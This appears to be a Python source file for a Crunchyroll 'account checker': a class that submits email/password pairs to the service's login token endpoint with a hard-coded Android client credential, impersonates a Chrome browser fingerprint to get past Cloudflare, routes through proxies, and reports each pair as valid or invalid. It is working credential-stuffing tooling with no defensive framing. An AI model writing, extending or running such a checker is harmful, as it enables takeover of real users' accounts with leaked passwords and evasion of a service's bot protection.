from curl_cffi import requests
import uuid

# Token officiel Android
AUTH_TOKEN = "dWtveTJxY2VzcmRvaHBlc3F1YnI6XzFLRDFxMGZDT1pYTlJMcFRUaU9KMTBBSkhkWFV1d2c="

class CrunchyChecker:
    def __init__(self, proxy=None):
        # Utilisation de curl_cffi pour contourner Cloudflare sans binaire instable
        self.session = requests.Session(impersonate="chrome110")
        if proxy:
            p = proxy.strip()
            self.session.proxies = {"http": f"http://{p}", "https": f"http://{p}"}
        self.device_id = str(uuid.uuid4())

    def get_token(self, email, password):
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers = {
            "Authorization": f"Basic {AUTH_TOKEN}",
            "User-Agent": "Crunchyroll/3.79.0 Android/12 okhttp/4.12.0",
        }
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "device_id": self.device_id,
            "scope": "offline_access",
        }
        try:
            resp = self.session.post(url, data=data, headers=headers, timeout=12)
            if resp.status_code == 200: 
                return "SUCCESS"
            if resp.status_code == 401: 
                return "INVALID"
            return "RETRY"
        except:
            return "ERROR"
